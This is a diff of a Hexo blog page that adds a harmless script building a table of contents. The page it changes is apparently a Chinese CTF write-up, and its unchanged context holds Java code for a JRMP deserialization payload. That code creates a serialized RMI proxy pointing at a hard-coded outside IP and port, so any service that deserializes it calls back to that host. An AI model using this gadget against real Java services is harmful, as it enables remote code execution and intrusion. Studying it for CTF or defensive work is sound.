@@ -38,6 +38,13 @@
         <hr>
     </div>
     <div class="post-content">
+        
+        <div id="table-of-content">
+            <ul id="table-of-content-ul">
+
+            </ul>
+        </div>
+
         <h1 id="i-short-you-1"><a href="#i-short-you-1" class="headerlink" title="i-short-you-1"></a>i-short-you-1</h1><h2 id="JRMP-payload"><a href="#JRMP-payload" class="headerlink" title="JRMP payload"></a>JRMP payload</h2><p>首先记住这个点：</p>
 <p>产生的这个obj，经过readObject后会往该服务器发送JRMP请求。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        String command = &quot;118.89.61.71:17777&quot;;</span><br><span class="line">        String host;</span><br><span class="line">        int port;</span><br><span class="line">        int sep = command.indexOf(&#x27;:&#x27;);</span><br><span class="line">        if ( sep &lt; 0 ) &#123;</span><br><span class="line">            port = new Random().nextInt(65535);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            host = command.substring(0, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + 1));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(Object.class.getClassLoader(), new Class[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line"></span><br><span class="line">        System.out.println(URLEncode(Base64.getEncoder().encodeToString(serialize(obj))).length());</span><br><span class="line">        System.out.println(URLEncode(Base64.getEncoder().encodeToString(serialize(obj))));</span><br><span class="line">//        unserialize(serialize(obj));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
@@ -114,7 +121,59 @@
 
 
 </div>
+<script>
+    window.onload = ()=>{
 
+        var getAllHeader = ()=>{
+            var content = document.getElementsByClassName('post-content')[0].childNodes
+            // var h2 = h1.getElementsByTagName("h2")
+            var result = []
+            var pair
+            for(var node of content){   
+                var tagName = (node.tagName?node.tagName:"").toLowerCase()
+                if(tagName === 'h1'){
+                    if(pair){
+                        result.push(pair)
+                    }
+                    pair = {"h1":node,"h2":[]}
+
+                }else if(tagName === 'h2'){
+                    pair.h2.push(node)
+                }
+
+            }
+            result.push(pair)
+            return result
+        }
+
+        var writeHeader = (headers)=>{
+            var _ul = document.getElementById("table-of-content-ul")
+            for(var p of headers){ 
+                console.log(p)
+
+                var h1_li = document.createElement('li')
+                var h1_a = document.createElement('a')
+                h1_a.innerText = p.h1.innerText
+                h1_a.href = `#${p.h1.id}`
+                h1_li.appendChild(h1_a)
+                var ul = document.createElement('ul')
+                for(var h2 of p.h2){
+                    var h2_li = document.createElement('li')
+                    var h2_a = document.createElement('a')
+                    h2_a.innerText = h2.innerText
+                    h2_a.href = `#${h2.id}`
+                    h2_li.appendChild(h2_a)
+                    ul.appendChild(h2_li)
+                }
+                h1_li.appendChild(ul)
+                _ul.appendChild(h1_li)
+            }
+        }
+        var headers = getAllHeader()
+        writeHeader(headers)
+    }
+    
+</script>
     
     <div class="footer" id="footer">
     <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
